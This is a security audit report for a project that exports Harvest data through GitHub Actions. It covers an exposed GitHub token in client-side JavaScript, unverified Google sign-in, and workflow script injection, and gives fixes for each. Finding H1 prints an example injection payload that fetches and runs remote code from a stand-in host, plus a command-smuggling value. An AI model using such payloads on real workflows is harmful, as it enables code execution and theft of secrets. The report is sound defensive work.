## CRITICAL

### C1. GitHub Personal Access Token embedded in public client-side JS
- `docs/app.js:3` `GITHUB_TOKEN: 'YOUR_GITHUB_TOKEN'` is replaced at deploy time by
  `deploy-pages.yml` with the real `WORKFLOW_TRIGGER_TOKEN` (a PAT with `repo` scope):
  `sed -i "s|YOUR_GITHUB_TOKEN|${GITHUB_TOKEN_SECRET}|g" docs/app.js`
- The result is served as a static file on GitHub Pages and used at `docs/app.js:190`
  (`Authorization: Bearer ${CONFIG.GITHUB_TOKEN}`).
- **Impact:** Anyone who opens the live Pages site (View Source / DevTools) can copy
  the PAT. A `repo`-scoped PAT allows pushing code and modifying workflows, which can
  exfiltrate every other secret in the repo â†’ full repository compromise.
- **Action (do first):**
  1. Rotate `WORKFLOW_TRIGGER_TOKEN` immediately (assume it is already exposed if the
     site has ever deployed to `wdiazux.github.io/harvest-sheet`).
  2. Remove the token from client code. A static GitHub Pages site cannot hold a secret.
     Replace the clientâ†’`/dispatches` call with one of:
     - A small serverless proxy (Cloudflare Worker / Vercel function) that holds the
       token server-side and validates the user before calling the GitHub API; or
     - A GitHub App with a backend exchanging short-lived tokens; or
     - Drop the web trigger and use `workflow_dispatch` from the Actions UI.

### C2. Web "authentication" is never verified server-side
- The browser signs in with Google and sends `user_email` + an `auth_data` blob.
- `web-trigger.yml` authorizes by checking the **client-supplied** `user_email`
  against `ALLOWED_USERS`. The Google OAuth ID token (JWT) is never validated on the
  server, and `token_hash = sha256(jwt + Date.now())` (`docs/app.js:242`) is
  unverifiable server-side (the server lacks the JWT and the client timestamp). The
  CSRF token is likewise cosmetic.
- **Impact:** Combined with C1, any visitor can call the dispatch API directly with any
  allow-listed email and trigger exports. The OAuth gate is purely decorative.
- **Action:** Verify the Google ID token server-side (validate signature, `aud` =
  your client ID, `exp`, `email_verified`) before authorizing â€” ideally in the proxy
  from C1, not in a public-repo workflow.

## HIGH

### H1. GitHub Actions script injection via `client_payload` / `inputs`
- `web-trigger.yml:65-84` interpolates untrusted values directly into `run:` shell:
  ```yaml
  USER_EMAIL="${{ github.event.client_payload.user_email }}"
  FROM_DATE="${{ github.event.client_payload.from_date }}"
  ...
  ```
  `${{ }}` is expanded **before** the shell runs, so a payload like
  `from_date: $(curl evil|sh)` or `"; <cmd>; "` executes on the runner with access to
  all secrets. `user_prefix` is sanitized only *after* assignment, which is too late.
  Same pattern (lower risk, needs write access) at `build-and-push.yml:33`.
- **Action:** Pass untrusted values through `env:` and reference quoted shell vars:
  ```yaml
  - env:
      USER_EMAIL: ${{ github.event.client_payload.user_email }}
      FROM_DATE: ${{ github.event.client_payload.from_date }}
    run: |
      [[ "$FROM_DATE" =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}$ ]] || exit 1
  ```

## Suggestions / Gaps

- **S1. Add request timeouts.** `convert_harvest_json_to_csv.py:476` and `:506`
  call `requests.get(...)` with no `timeout=`. A stalled Harvest API can hang the
  daily cron/workflow indefinitely. Add `timeout=(5, 30)` and a small retry/backoff.
- **S2. Add Dependabot.** No `.github/dependabot.yml`. Enabling `pip` +
  `github-actions` ecosystems would have surfaced the requests/python-dotenv CVEs
  automatically.
- **S3. Add CI checks.** No tests (CLAUDE.md confirms none) and no static analysis.
  Add a lint workflow (ruff/mypy) and enable CodeQL + secret scanning â€” the latter
  would flag C1.
- **S4. Two dependency sources can drift.** `requirements.txt` uses exact pins (used by
  the Docker build and Actions), while `shell.nix` pulls unpinned versions from
  `nixpkgs-unstable`. "Works in nix-shell" does not guarantee "works in the container."
  Document this, or align the two.

### Hardening (nice-to-have)
- Pin third-party Actions to commit SHAs.
- `docs/` config references owner `wdiazux` / repo `harvest-sheet` while the local
  directory is `harvest-report` â€” confirm this is intentional and not stale config.
